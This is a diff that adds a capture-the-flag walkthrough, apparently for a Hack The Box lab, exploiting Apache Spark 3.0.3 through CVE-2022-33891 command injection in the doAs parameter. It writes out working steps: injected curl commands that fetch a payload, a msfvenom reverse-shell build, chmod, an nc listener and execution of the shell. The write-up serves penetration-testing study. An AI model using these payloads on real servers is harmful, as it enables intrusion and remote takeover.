@@ -49,4 +49,57 @@ There are 2 web ports open on the machine, the first of which is port 8080, this
 
 ![image](https://github.com/user-attachments/assets/ebe7ccb9-23d9-402f-88cb-5b4947416071)
 
-The version of Apache Spark running can be seen in the top left next to the logo, the version in use is 3.0.3. 
+The version of Apache Spark running can be seen in the top left next to the logo, the version in use is 3.0.3. A quick search shows this version is vulnerable to a Command Injection vulnerability, [CVE-2022–33891](https://nvd.nist.gov/vuln/detail/cve-2022-33891). 
+
+I found [this writeup](https://vsociety.medium.com/apache-zero-days-apache-spark-command-injection-vulnerability-cve-2022-33891-2ea436576145) of the vulnerability useful when epxloiting this box. The code in this writeup gives us the clues we need to exploit the vulnerability, the ?doAs parameter on Spark accepts a valid user when passed into the parameter and checks the users membership using a raw Linux command, see code below: 
+
+```php
+private def getUnixGroups(username: String): Set[String] = {
+val cmdSeq = Seq("bash", "-c", "id -Gn " + username)
+// we need to get rid of the trailing "\n" from the result of command execution
+Utils.executeAndGetOutput(cmdSeq).stripLineEnd.split(" ").toSet
+Utils.executeAndGetOutput(idPath :: "-Gn" :: username :: Nil).stripLineEnd.split(" ").toSet
+}}
+```
+This means if we can find a legitimate user (root, easy!), we can then follow it up with a command of our own which will be executed by chaining commands. 
+
+I got excited and began hammering in some commands that chained common PoCs such as 'id' and 'whoami' however these seemed to fail. After reading the writeup more closely I realised this is Blind Command Injection. So instead fired up a web server on my local machine on port 8081 and then tried to access it from the Apache Spark box. This worked, see command and screenshot below showing the payload in the URL and ht on the web server:
+
+```bash
+http://10.129.228.19:8080/?doAs=root;curl%2010.10.14.5:8081
+```
+
+![image](https://github.com/user-attachments/assets/38ddeb1f-d845-4c34-8036-4a7607d17250)
+
+Using a sleep command in a PoC such as ';sleep%2020' would have also shown this is working.
+
+From here RCE should be trivial, I created an exploit file using msfvenom:
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f elf -o shell.elf
+```
+
+Used the command injection vulnerability to upload the shell and modify it to make it executable in a one liner payload:
+
+```text
+# URL With Payload
+http://10.129.228.19:8081/?doAs=root;curl%2010.10.14.5:8081/shell.elf%20-o%20./shell.elf;chmod%20777%20shell.elf
+
+# Decoded Command
+curl 10.10.14.5:8081/shell.elf -o ./shell.elf;chmod 777 shell.elf
+```
+
+Finally I started a listener with nc:
+
+```bash
+nc -nlvp 80
+```
+
+And used the command injection to run the file:
+
+```bash
+http://10.129.228.19:8081/?doAs=root;./shell.elf
+```
+
+The shell with proof and flag can be seen below:
+![image](https://github.com/user-attachments/assets/ecdbd0fd-939a-4daf-a5e5-edb37fda3a0b)
